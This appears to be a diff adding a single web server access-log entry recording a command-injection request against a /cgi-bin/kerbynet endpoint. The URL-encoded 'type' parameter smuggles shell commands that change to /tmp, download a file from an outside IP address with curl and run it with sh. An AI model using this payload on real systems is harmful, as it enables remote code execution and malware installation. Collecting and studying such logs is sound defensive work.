@@ -1,0 +1,1 @@
+40.67.155.93 - - [19/Jul/2020:15:49:59 +0300] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 301 162 "-" "-" "-"
